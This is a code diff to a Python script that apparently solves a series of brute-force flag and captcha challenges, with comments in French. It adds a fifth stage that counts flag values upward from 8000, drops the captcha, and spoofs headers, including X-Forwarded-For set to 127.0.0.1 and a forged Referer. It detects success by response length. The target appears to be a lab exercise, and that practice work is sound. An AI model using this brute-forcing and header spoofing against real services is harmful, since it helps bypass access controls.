@@ -36,6 +36,8 @@ class Session:
             self.challenge = 3
         elif "captcha4" in url:
             self.challenge = 4
+        elif "captcha5" in url:
+            self.challenge = 5
 
     def prepare_request(self):
         """
@@ -62,11 +64,18 @@ class Session:
             if not hasattr(self, "current"):
                 # Dans le test initiale on avait self.current = 7000 mais pour aller plus vite on le commente une fois trouvé
                 self.current = 7629
+        elif self.challenge == 5:
+            if not hasattr(self, "current"):
+                # Dans le test initiale on avait self.current = 8000 mais pour aller plus vite on le commente une fois trouvé
+                self.current = 8000
             else:
                 self.current += 1
 
         self.flag_value = self.current
-        self.payload = {'flag': self.flag_value, 'captcha': self.captcha_value, 'submit': 'envoyer'}
+        if self.challenge == 5:
+            self.payload = {'flag': f" {self.flag_value}", 'submit': 'envoyer'}
+        else :
+            self.payload = {'flag': f" {self.flag_value}", 'captcha': self.captcha_value, 'submit': 'envoyer'}
         insert = str(self.flag_value) + str(self.captcha_value)
         self.hashed_payload = hashlib.md5(insert.encode()).hexdigest()
         #print(self.hashed_payload)
@@ -76,10 +85,19 @@ class Session:
         """
         Sends the flag and captcha.
         """
-        headers = {
-            "Magic-Word": "please"
-        }
-        if self.challenge == 4:
+
+        if self.challenge >= 4:
+            if self.challenge == 4:
+                headers = {
+                    "Magic-Word": "please"
+                }
+            else:
+                headers = {
+                    "Magic-Word": "please",
+                    "User-Agent": "Mozilla/5.0",
+                    "Referer": "http://31.220.95.27:9002/captcha4/",
+                    "X-Forwarded-For": "127.0.0.1"
+                }
             self.response = self.current_session.post(
                 self.url,
                 headers=headers,
@@ -136,6 +154,36 @@ class Session:
 
             if "incorrect captcha" in text:
                 return False
+
+            if "correct" in text:
+                self.valid_flag = self.flag_value
+
+                print(self.response.text)
+
+                print("FLAG TROUVEE :", self.valid_flag)
+
+                return True
+
+        if self.challenge == 5:
+
+            text = self.response.text.lower()
+            print(text)
+
+            if "incorrect flag" in text:
+                return False
+
+            if "incorrect captcha" in text:
+                return False
+
+            if len(text) != 1194:
+
+                self.valid_flag = self.flag_value
+
+                print(self.response.text)
+
+                print("FLAG TROUVEE :", self.valid_flag)
+
+                return True
 
             if "correct" in text:
                 self.valid_flag = self.flag_value
